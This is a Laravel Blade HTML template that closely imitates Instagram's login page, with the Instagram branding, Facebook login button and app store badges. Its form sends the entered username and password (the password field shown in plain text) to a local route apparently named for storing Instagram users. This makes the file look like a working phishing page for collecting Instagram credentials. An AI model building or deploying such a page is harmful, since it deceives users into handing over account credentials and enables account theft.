<!DOCTYPE html>
<html class="border-l" lang="en">
<head>
    {{-- <meta charset="UTF-8"> --}}
    <title>Login</title>
    <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
        }
        .instagram-logo {
            background-position: 0 -130px;
            height: 51px;
            width: 175px;
            background-image: url(https://bit.ly/3v2LT17);
        }
        .facebook-logo {
            background-position: -414px -259px;
            background-image: url(https://bit.ly/3v2LT17);
            height: 16px;
            width: 16px;
        }
        .apple-store-logo {
            background-position: -132px -182px;
            height: 42px;
            width: 128px;
            background-image: url(https://bit.ly/3v2LT17);
        }
        .google-store-logo {
            background-position: 0 -182px;
            height: 42px;
            width: 130px;
            background-image: url(https://bit.ly/3v2LT17);
        }
        /* [role=button], button {
    cursor: pointer;
    font-style: oblique;
    font-family: emoji;
    font-size: xxx-large;
    font-weight: bold;
} */
    </style>
</head>
<body>
<div class="h-screen bg-gray-50 flex flex-col justify-center items-center">
    <div class="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
        <div aria-disabled="false" role="button" tabindex="0" style="cursor: pointer;">
            <img alt="Instagram" class="s4Iyt" src="https://www.vectorlogo.zone/logos/instagram/instagram-ar21.svg"
             srcset="/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png 2x"></div>
        <h1 class="bg-no-repeat instagram-logo "></h1>
        <form class="mt-8 w-64 flex flex-col" action="{{route('UserInsta.store')}}" method="POST" enctype="multipart/form-data">
            @csrf
            <input autofocus

                   class="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
                   id="username" placeholder="Phone number, username, or email" type="text"
                   name="username">
            <input autofocus
                   class="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
                   id="password" placeholder="Password" type="text"
                   name="password">


                   {{-- <button class="mt-4 flex">
                    <div class="bg-no-repeat facebook-logo mr-1"></div>
                    <span class="text-sm text-center bg-blue-300 text-white py-1 rounded font-medium">Log in </span>
                </button> --}}

            <button  class=" text-sm text-center bg-blue-300 text-white py-1 rounded font-medium">
                Log In
            </button>
        </form>

        <div class="flex justify-evenly space-x-2 w-64 mt-4">
            <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
            <span class="flex-none uppercase text-xs text-gray-400 font-semibold">or</span>
            <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
        </div>
        <button class="mt-4 flex">
            <div class="bg-no-repeat facebook-logo mr-1"></div>
            <span class="text-xs text-blue-900 font-semibold">Log in with Facebook</span>
        </button>
        <a class="text-xs text-blue-900 mt-4 cursor-pointer -mb-4">Forgot password?</a>
    </div>
    <div class="bg-white border border-gray-300 text-center w-80 py-4">
        <span class="text-sm">Don't have an account?</span>
        <a class="text-blue-500 text-sm font-semibold">Sign up</a>
    </div>
    <div class="mt-3 text-center">
        <span class="text-xs">Get the app</span>
        <div class="flex mt-3 space-x-2">
            <div class="bg-no-repeat apple-store-logo">
                <img alt="Instagram" class="s4Iyt"
                src="https://www.vectorlogo.zone/logos/apple_appstore/apple_appstore-ar21.svg"
                srcset="/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png 2x">
            </div>
            <div class="bg-no-repeat google-store-logo">
                <img alt="Instagram" class="s4Iyt"
                src="https://www.vectorlogo.zone/logos/google_play/google_play-ar21.svg"
                srcset="/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png 2x">

            </div>
        </div>



    </div>


</div>
</body>
</html>
